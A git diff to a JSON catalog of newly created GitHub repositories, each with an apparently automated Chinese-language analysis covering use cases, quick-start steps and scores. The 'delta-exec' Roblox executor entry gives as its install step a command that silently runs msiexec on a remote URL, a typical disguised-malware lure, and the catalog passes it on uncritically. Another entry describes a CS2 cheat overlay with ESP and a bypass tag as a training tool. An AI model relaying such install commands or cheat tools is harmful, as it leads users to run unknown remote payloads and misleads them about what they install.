@@ -1,6 +1,6 @@
 {
   "version": "1",
-  "updatedAt": "2026-05-11T05:41:25.001Z",
+  "updatedAt": "2026-05-12T05:09:15.535Z",
   "projects": [
     {
       "owner": "codecrafters-io",
@@ -29050,6 +29050,481 @@
         "category": "AI Agent"
       },
       "analyzedAt": "2026-05-11T05:41:24.988Z"
+    },
+    {
+      "owner": "ZJunCher",
+      "repo": "xiaoyan-ai-dev-assistant",
+      "fullName": "ZJunCher/xiaoyan-ai-dev-assistant",
+      "description": "基于 RAG 混合检索与多轮记忆的 AI 研发助手，支持团队知识问答，也适合新手学习 RAG 应用开发。",
+      "language": "Java",
+      "topics": [],
+      "license": "Unknown",
+      "createdAt": "2026-05-12T02:26:49Z",
+      "url": "https://github.com/ZJunCher/xiaoyan-ai-dev-assistant",
+      "analysis": {
+        "positioning": "团队RAG知识库，智能问答提效AI研发助手",
+        "useCases": [
+          "你查找团队研发文档 → 它帮你集中管理、智能检索与快速问答",
+          "你对项目背景不了解或有疑问 → 它帮你快速理解、减少重复沟通成本",
+          "你想学习RAG应用开发 → 它提供基于Java+LangChain4j的实践范例"
+        ],
+        "audience": "研发团队成员（提效获取知识）和RAG应用开发者（学习实践）",
+        "quickStart": {
+          "prerequisites": "JDK 17+, Maven, MySQL 8+, Redis 6+, 阿里百炼DashScope API Key",
+          "steps": [
+            "创建并初始化MySQL数据库",
+            "配置API Key、数据库、Redis等环境变量",
+            "使用 `mvn spring-boot:run` 启动项目"
+          ],
+          "note": "Pinecone可选，本地默认使用内存向量库"
+        },
+        "competitors": [],
+        "pricing": "免费（开源项目，需自备大模型与向量库API Key）",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "功能全面，技术栈新颖实用（Spring Boot 3.5 + LangChain4j），文档详尽，系统流程清晰，兼顾团队应用与新手学习，代码结构良好。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度暂无数据（Issue未开启或无记录）",
+        "category": "AI Agent"
+      },
+      "analyzedAt": "2026-05-12T05:06:07.824Z"
+    },
+    {
+      "owner": "RadianceToadAmend",
+      "repo": "cs2-overlay-utility",
+      "fullName": "RadianceToadAmend/cs2-overlay-utility",
+      "description": "CS2 external overlay tool — memory reader, entity ESP, and visual aids. D3D11 render, no injection. For educational purposes.",
+      "language": "C++",
+      "topics": [
+        "cs-2-bypass",
+        "cs2",
+        "csgo",
+        "d3d11",
+        "game-tool",
+        "imgui",
+        "memory-reader",
+        "open-source",
+        "overlay",
+        "source2"
+      ],
+      "license": "MIT",
+      "createdAt": "2026-05-11T19:16:33Z",
+      "url": "https://github.com/RadianceToadAmend/cs2-overlay-utility",
+      "analysis": {
+        "positioning": "CS2外部覆盖辅助工具，专为离线训练与技能提升设计。",
+        "useCases": [
+          "你进行CS2离线训练 → 它提供视觉瞄准指引，提升射击精度。",
+          "你在CS2本地机器人比赛中视野不佳 → 它高亮玩家，增强目标可见性。",
+          "你希望监控CS2性能 → 它实时显示FPS、ping和系统指标。"
+        ],
+        "audience": "寻求在CS2离线模式下提升技能、进行训练和性能监控的玩家及C++/D3D11开发者。",
+        "quickStart": {
+          "prerequisites": "Windows 10/11 x64、已安装CS2、Visual Studio 2022。",
+          "steps": [
+            "克隆项目到本地：`git clone https://github.com/yourname/cs2-game-tool.git`",
+            "使用CMake构建Release版本：`cmake -S . -B build -A x64` 后 `cmake --build build --config Release`",
+            "先启动CS2并进入机器人比赛，然后运行生成的 `build\\bin\\Release\\cs2_game_tool.exe`。"
+          ],
+          "note": null
+        },
+        "competitors": [],
+        "pricing": "免费，MIT许可证。",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "C++编写，采用D3D11无注入外部覆盖技术，直接读取游戏内存实现实体ESP与视觉辅助，技术挑战性和学习价值高。",
+        "isVibeCoding": true,
+        "communityActivity": "Issue统计为0开0关，项目活跃度有待观察，或为早期阶段/维护者自行处理问题。",
+        "category": "其他"
+      },
+      "analyzedAt": "2026-05-12T05:06:32.256Z"
+    },
+    {
+      "owner": "haydenbleasel",
+      "repo": "files-sdk",
+      "fullName": "haydenbleasel/files-sdk",
+      "description": "A unified storage SDK for object and blob backends. One small, honest API. Web-standards I/O.",
+      "language": "TypeScript",
+      "topics": [
+        "agents",
+        "blob",
+        "cloudflare",
+        "files",
+        "google",
+        "minio",
+        "r2",
+        "s3",
+        "storage",
+        "vercel"
+      ],
+      "license": "MIT",
+      "createdAt": "2026-05-08T07:37:16Z",
+      "url": "https://github.com/haydenbleasel/files-sdk",
+      "analysis": {
+        "positioning": "统一多云存储SDK，对象和Blob操作一键搞定。",
+        "useCases": [
+          "你需要在AWS S3、Cloudflare R2、Google GCS等多个云存储间切换 → 它提供统一API，代码无需修改即可轻松适配不同存储后端。",
+          "你想让AI Agent能够安全地访问和操作存储桶中的文件 → 它集成Vercel AI、OpenAI等AI SDK，为AI模型提供统一的文件操作接口。",
+          "你关心数据传输的标准化和效率 → 它采用Web标准I/O（Blob, Stream等），避免平台特定类型，提升兼容性。"
+        ],
+        "audience": "需要统一管理多云存储、或为AI Agent提供文件访问能力的开发者。",
+        "quickStart": {
+          "prerequisites": "Node.js环境及npm/yarn包管理器",
+          "steps": [
+            "npm install files-sdk",
+            "import { Files, s3 } from \"files-sdk\"; // 或其他适配器，如r2, gcs",
+            "const files = new Files({ adapter: s3({ bucket: \"your-bucket\" }) });",
+            "await files.upload(\"path/to/file.png\", fileData, { contentType: \"image/png\" });"
+          ],
+          "note": "通过更换导入的适配器（如`files-sdk/r2`, `files-sdk/gcs`），核心业务逻辑无需修改。"
+        },
+        "competitors": [],
+        "pricing": "免费 (MIT License)",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "统一API、Web标准I/O、可树摇、提供原生客户端逃生舱，良好集成AI工具，开发者体验优秀。",
+        "isVibeCoding": true,
+        "communityActivity": "项目启动不久（416 Star），有新Issue但尚未关闭，活跃度有待观察。",
+        "category": "后端框架"
+      },
+      "analyzedAt": "2026-05-12T05:06:52.077Z"
+    },
+    {
+      "owner": "amircloner",
+      "repo": "g2ray",
+      "fullName": "amircloner/g2ray",
+      "description": "Self-hosted proxy setup running inside GitHub Codespaces — for educational purposes only",
+      "language": "Dockerfile",
+      "topics": [],
+      "license": "NOASSERTION",
+      "createdAt": "2026-05-09T17:18:16Z",
+      "url": "https://github.com/amircloner/g2ray",
+      "analysis": {
+        "positioning": "GitHub Codespaces一键部署的自建代理，仅供学习。",
+        "useCases": [
+          "你受网络限制想访问外部资源 → 它帮你快速部署一个基于Codespaces的代理服务。",
+          "你想免费体验自建代理而不购买服务器 → 它利用GitHub免费额度提供临时的代理环境。",
+          "你希望学习V2Ray/Xray代理的部署和使用 → 它提供一个开箱即用的实验平台。"
+        ],
+        "audience": "寻找免费、临时、易部署的个人代理解决方案，或对代理技术感兴趣的学习者。",
+        "quickStart": {
+          "prerequisites": "GitHub账号",
+          "steps": [
+            "Fork此仓库",
+            "在你的Fork仓库中，点击“Code”按钮下的“Codespaces”选项卡",
+            "在main分支上创建新的Codespace",
+            "等待环境构建和初始化",
+            "在终端获取连接字符串"
+          ],
+          "note": "如默认区域不工作，可尝试在不同数据中心创建Codespace。"
+        },
+        "competitors": [
+          {
+            "name": "传统自建代理 (如：V2Ray/Xray on VPS)",
+            "method": "需购买VPS，手动配置服务器",
+            "models": "V2Ray/Xray等多种协议",
+            "pricing": "VPS费用"
+          },
+          {
+            "name": "商业VPN服务 (如：ExpressVPN)",
+            "method": "下载客户端，一键连接",
+            "models": "通常是私有协议",
+            "pricing": "包月/年付费"
+          }
+        ],
+        "pricing": "部分免费。利用GitHub Codespaces的免费额度（每月120核心小时，此配置约60小时）。",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "依赖GitHub Codespaces一键部署，抽象了底层复杂性，上手快。但仍需理解代理客户端配置。",
+        "isVibeCoding": true,
+        "communityActivity": "活跃度低，Issue总数少（开启2/关闭1），表明项目处于维护初期或使用人数不多。",
+        "category": "DevOps"
+      },
+      "analyzedAt": "2026-05-12T05:07:06.707Z"
+    },
+    {
+      "owner": "cclank",
+      "repo": "cell-architecture-studio",
+      "fullName": "cclank/cell-architecture-studio",
+      "description": "Interactive 3D cell architecture gallery built with React and Three.js",
+      "language": "TypeScript",
+      "topics": [],
+      "license": "MIT",
+      "createdAt": "2026-05-10T10:25:42Z",
+      "url": "https://github.com/cclank/cell-architecture-studio",
+      "analysis": {
+        "positioning": "基于React和Three.js的交互式3D细胞结构画廊。",
+        "useCases": [
+          "你是一名生物学学生或教师，想直观学习/展示细胞结构 → 它提供交互式3D细胞模型，多细胞类型可选，并显示器官细节。",
+          "你需要在教育应用中整合高级3D生物内容 → 它展示了如何利用React、Three.js和GLB资产构建高保真、可交互的教育界面。",
+          "你对AI辅助学习感兴趣 → 它内置AI导师面板，提供学习提示和进度追踪，辅助掌握生物知识。"
+        ],
+        "audience": "生物学学生、教师及教育内容开发者，用于学习、教学和构建交互式3D生物应用。",
+        "quickStart": {
+          "prerequisites": null,
+          "steps": [
+            "npm install",
+            "npm run dev"
+          ],
+          "note": null
+        },
+        "competitors": [],
+        "pricing": "免费",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "项目架构清晰，技术栈现代（React 19, Three.js, TS），功能完整且提供交互式3D演示，文档详尽，具备教学辅助功能，适合学习和参考。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度低，暂无Issue互动。",
+        "category": "其他"
+      },
+      "analyzedAt": "2026-05-12T05:07:19.760Z"
+    },
+    {
+      "owner": "AvenueSleuth",
+      "repo": "delta-exec",
+      "fullName": "AvenueSleuth/delta-exec",
+      "description": "Delta Exec scripting utility",
+      "language": "Python",
+      "topics": [
+        "delta-executor-windows",
+        "delta-exploit",
+        "delta-pc"
+      ],
+      "license": "MIT",
+      "createdAt": "2026-05-08T20:10:42Z",
+      "url": "https://github.com/AvenueSleuth/delta-exec",
+      "analysis": {
+        "positioning": "一款在Windows上原生运行的Roblox脚本执行引擎，强大、轻量、原生。",
+        "useCases": [
+          "你希望在Roblox中测试或运行复杂脚本 → 它提供L8级别执行，确保兼容性和稳定性。",
+          "你希望自动化Roblox任务或探索游戏机制 → 它提供防检测、防崩溃的终端式脚本执行体验。",
+          "你关注脚本执行的轻量与效率 → 它基于Python构建，提供“黑客风格”CLI界面，无臃肿无卡顿。"
+        ],
+        "audience": "Roblox脚本开发者、高级玩家或寻求自动化、测试、探索Roblox游戏机制的用户。",
+        "quickStart": {
+          "prerequisites": "Windows操作系统",
+          "steps": [
+            "打开命令提示符 (CMD)。",
+            "复制并运行提供的安装命令：`cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem delta exec`",
+            "启动Roblox并加入任意游戏。",
+            "打开Delta Executor终端。",
+            "输入 `inject` 注入引擎到Roblox进程。",
+            "输入 `exec <script_name.lua>` 或粘贴原始脚本并执行。"
+          ],
+          "note": "目前仅支持Windows平台。"
+        },
+        "competitors": [],
+        "pricing": "免费（100%开源包装器）",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "项目描述大量使用“最先进”、“强大”、“黑客风格CLI”、“绕过保护”、“未被检测”、“L8执行”等词汇，旨在打造酷炫、强大的技术形象，满足寻求突破限制的用户心理。",
+        "isVibeCoding": true,
+        "communityActivity": "Issue统计显示开启和关闭均为0，表明社区活跃度较低或不通过GitHub Issues进行管理。",
+        "category": "安全"
+      },
+      "analyzedAt": "2026-05-12T05:07:38.622Z"
+    },
+    {
+      "owner": "iampedii",
+      "repo": "WhiteDNS",
+      "fullName": "iampedii/WhiteDNS",
+      "description": "Source-available Android DNS tunneling client with VPN and proxy modes, backed by MasterDNS & StormDNS.",
+      "language": "Kotlin",
+      "topics": [
+        "vpn",
+        "vpn-client"
+      ],
+      "license": "NOASSERTION",
+      "createdAt": "2026-05-10T05:27:42Z",
+      "url": "https://github.com/iampedii/WhiteDNS",
+      "analysis": {
+        "positioning": "Android平台DNS隧道客户端，支持VPN和代理模式。",
+        "useCases": [
+          "你所在的网络有审查或限制 → 它帮你通过DNS隧道绕过这些限制。",
+          "你想加密Android设备流量 → 它帮你提供VPN模式保护所有网络连接。",
+          "你需要为特定应用配置代理 → 它帮你设置本地SOCKS5或HTTP代理。"
+        ],
+        "audience": "关注网络隐私、需要突破网络限制的Android用户，以及寻求透明度但受限于许可的开发者。",
+        "quickStart": {
+          "prerequisites": "Android设备",
+          "steps": [
+            "访问项目的官方Telegram频道获取最新APK。",
+            "在Android设备上安装该APK。"
+          ],
+          "note": "严格禁止从Google Play或其他非官方渠道下载，以防安装到修改或不安全的版本。"
+        },
+        "competitors": [
+          {
+            "name": "Intra",
+            "method": "Android应用",
+            "models": "DNS over HTTPS/TLS",
+            "pricing": "免费"
+          },
+          {
+            "name": "WireGuard",
+            "method": "Android应用 / VPN协议",
+            "models": "通用VPN隧道",
+            "pricing": "免费（应用）"
+          }
+        ],
+        "pricing": "官方分发免费使用，但属于私有源代码可用软件，禁止复制、修改或重新发布。",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "采用Kotlin、Jetpack Compose和Material 3等现代Android技术栈，项目结构清晰，合理集成`tun2proxy`等本地库，显示出良好的工程实践。",
+        "isVibeCoding": true,
+        "communityActivity": "Issue开启数远多于关闭数（14:1），表明社区活跃度较低或项目刚起步，问题解决响应较慢。",
+        "category": "安全"
+      },
+      "analyzedAt": "2026-05-12T05:07:56.999Z"
+    },
+    {
+      "owner": "chojs23",
+      "repo": "concord",
+      "fullName": "chojs23/concord",
+      "description": "A feature-rich TUI client for Discord, written in Rust.",
+      "language": "Rust",
+      "topics": [
+        "chat-client",
+        "cli",
+        "discord",
+        "discord-client",
+        "ratatui",
+        "rust",
+        "terminal",
+        "terminal-ui",
+        "tui"
+      ],
+      "license": "GPL-3.0",
+      "createdAt": "2026-05-08T15:51:03Z",
+      "url": "https://github.com/chojs23/concord",
+      "analysis": {
+        "positioning": "Rust编写的Discord终端TUI客户端，功能丰富。",
+        "useCases": [
+          "你需要在无图形界面或终端环境使用Discord → 它帮你通过TUI客户端连接并交互。",
+          "你厌倦了Discord官方客户端的资源占用 → 它提供轻量、高效的终端体验。",
+          "你希望以命令行方式高效管理Discord消息 → 它支持发送、编辑、回复、文件上传等完整消息操作。"
+        ],
+        "audience": "偏爱终端操作、追求极致效率或轻量级体验的Discord用户。",
+        "quickStart": {
+          "prerequisites": "Rust稳定版工具链和Cargo",
+          "steps": [
+            "cargo install concord",
+            "concord"
+          ],
+          "note": null
+        },
+        "competitors": [
+          {
+            "name": "Discord 官方客户端",
+            "method": "桌面GUI应用",
+            "models": "Discord服务",
+            "pricing": "免费"
+          },
+          {
+            "name": "disct (Discord CLI Chat Tool)",
+            "method": "CLI应用 (Python)",
+            "models": "Discord服务",
+            "pricing": "免费"
+          }
+        ],
+        "pricing": "免费",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "Rust语言编写，使用ratatui提供功能丰富的Discord TUI体验。安装方式多样，文档清晰，核心功能完善（除语音）。虽然Issue关闭比例不高，但项目描述和安装指引都体现了较高的开发质量和用户友好度。",
+        "isVibeCoding": true,
+        "communityActivity": "Issue开启9个/关闭6个，活跃度一般，但有持续维护迹象。",
+        "category": "CLI工具"
+      },
+      "analyzedAt": "2026-05-12T05:08:19.225Z"
+    },
+    {
+      "owner": "HiDream-ai",
+      "repo": "HiDream-O1-Image",
+      "fullName": "HiDream-ai/HiDream-O1-Image",
+      "description": "",
+      "language": "Python",
+      "topics": [],
+      "license": "MIT",
+      "createdAt": "2026-05-08T13:36:17Z",
+      "url": "https://github.com/HiDream-ai/HiDream-O1-Image",
+      "analysis": {
+        "positioning": "原生统一高分辨率多功能图像生成基础模型。",
+        "useCases": [
+          "你想通过文字生成逼真图像 → 它帮你直接生成高达2048x2048的超清图片。",
+          "你需要精确排版多语言长文本到图片 → 它帮你智能布局并渲染文本，实现精细控制。",
+          "你希望特定主体在不同场景中保持一致性 → 它帮你实现主题驱动的个性化图像定制与编辑。"
+        ],
+        "audience": "图像AI开发者、研究人员和内容创作者，寻求高效、高分辨率、多功能一体的图像生成方案。",
+        "quickStart": {
+          "prerequisites": "Python环境（本地部署）；无需额外设置（在线试用）。",
+          "steps": [
+            "访问Hugging Face Spaces在线体验：[HiDream-O1-Image](https://huggingface.co/spaces/HiDream-ai/HiDream-O1-Image)。",
+            "（本地部署）从Hugging Face Repo下载模型，运行`inference.py`脚本。"
+          ],
+          "note": "在线试用无需配置，本地部署需配置Python环境及依赖。"
+        },
+        "competitors": [
+          {
+            "name": "Stable Diffusion (或类似开源DiT模型)",
+            "method": "本地部署/API",
+            "models": "多种变体",
+            "pricing": "免费（开源）"
+          },
+          {
+            "name": "Midjourney / DALL-E",
+            "method": "订阅服务/API",
+            "models": "闭源模型",
+            "pricing": "付费（订阅制）"
+          }
+        ],
+        "pricing": "免费（开源项目，提供在线试用和模型下载）。",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "核心功能强大，支持原生高分辨率与多任务，8B参数表现卓越。提供在线试用和模型开源，易于上手。README详细，但Issue解决速度待观察。",
+        "isVibeCoding": true,
+        "communityActivity": "项目处于早期活跃阶段，有待观察Issue响应与解决速度。",
+        "category": "AI Agent"
+      },
+      "analyzedAt": "2026-05-12T05:08:33.758Z"
+    },
+    {
+      "owner": "Donchitos",
+      "repo": "Claude-Code-Game-Studios",
+      "fullName": "Donchitos/Claude-Code-Game-Studios",
+      "description": "Turn Claude Code into a full game dev studio — 49 AI agents, 72 workflow skills, and a complete coordination system mirroring real studio hierarchy.",
+      "language": "Shell",
+      "topics": [
+        "ai-agents",
+        "ai-assisted-development",
+        "anthropic",
+        "claude",
+        "claude-code",
+        "game-design",
+        "game-development",
+        "gamedev",
+        "godot",
+        "indie-game-dev",
+        "unity",
+        "unreal-engine"
+      ],
+      "license": "MIT",
+      "createdAt": "2026-02-12T05:21:38Z",
+      "url": "https://github.com/Donchitos/Claude-Code-Game-Studios",
+      "analysis": {
+        "positioning": "将Claude Code会话转变为一个模拟真实的游戏开发AI工作室。",
+        "useCases": [
+          "你用AI单枪匹马开发游戏 → 它提供一个有组织、有结构的49人AI团队，避免低质量代码和设计偏离。",
+          "你担忧AI代码质量和设计一致性 → 它通过专业Agent进行设计评审、质量把控，确保项目符合愿景。",
+          "你希望AI更像一个协作团队 → 它模拟真实工作室层级，实现AI间高效分工协作，管理游戏项目。"
+        ],
+        "audience": "独立游戏开发者、AI游戏开发爱好者，希望借助Claude Code构建结构化、高质量的游戏项目。",
+        "quickStart": {
+          "prerequisites": "Anthropic Claude Code访问权限。",
+          "steps": [
+            "克隆GitHub项目到本地。",
+            "根据项目文档，将Agent、Skill等配置导入Claude Code环境。"
+          ],
+          "note": null
+        },
+        "competitors": [],
+        "pricing": "免费（项目代码MIT开源，但使用需依赖Anthropic Claude Code服务，该服务可能有其自身的收费标准）。",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "将单一AI会话包装成一个拥有49个专业Agent、72项技能的完整游戏开发工作室，概念新颖、架构精巧，极大提升了AI协作开发游戏的组织性和效率。",
+        "isVibeCoding": true,
+        "communityActivity": "活跃。Issue开启关闭比例（16/9）显示社区参与度高，项目维护及时。",
+        "category": "AI Agent"
+      },
+      "analyzedAt": "2026-05-12T05:09:15.523Z"
     }
   ]
 }
